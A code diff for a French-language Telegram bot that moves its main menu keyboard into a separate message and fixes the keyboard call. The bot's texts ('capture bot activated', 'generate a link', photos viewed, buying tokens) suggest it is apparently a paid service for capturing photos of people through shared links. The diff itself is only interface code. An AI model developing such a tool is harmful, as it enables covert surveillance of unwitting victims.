@@ -248,12 +248,6 @@ bot.onText(/\/start/, async (msg) => {
     const chatId = msg.chat.id;
     const user = await getUser(chatId);
     
-    const mainKeyboard = createStyledKeyboard([
-        { text: "🎯 Générer un lien", callback_data: "generate_link" },
-        { text: "💰 Mon solde", callback_data: "check_balance" },
-        { text: "💎 Acheter des jetons", callback_data: "buy_coins" },
-        { text: "❓ Aide", callback_data: "show_help" }
-    ], 
     await sendTypingMessage(chatId,
         createStyledMessage(
             "🔥 BOT DE CAPTURE ACTIVÉ",
@@ -267,8 +261,18 @@ bot.onText(/\/start/, async (msg) => {
             `• Photos vues : <b>${user.totalPhotosViewed}</b>`,
             "primary"
         ),
-        { parse_mode: 'HTML', ...mainKeyboard }
+        { parse_mode: 'HTML' }
     );
+    
+    // Envoi du clavier séparément après le message
+    const mainKeyboard = createStyledKeyboard([
+        { text: "🎯 Générer un lien", callback_data: "generate_link" },
+        { text: "💰 Mon solde", callback_data: "check_balance" },
+        { text: "💎 Acheter des jetons", callback_data: "buy_coins" },
+        { text: "❓ Aide", callback_data: "show_help" }
+    ], 2);
+    
+    bot.sendMessage(chatId, "Choisissez une option :", mainKeyboard);
 });
 
 bot.onText(/\/acheter/, (msg) => {
@@ -837,7 +841,6 @@ async function sendTypingMessage(chatId, text, options = {}) {
     await new Promise(resolve => setTimeout(resolve, 800));
     return bot.sendMessage(chatId, text, options);
 }
-
 // Fonction pour créer un menu contextuel dynamique
 function createContextMenu(actions) {
     const keyboard = { reply_markup: { inline_keyboard: [] } };
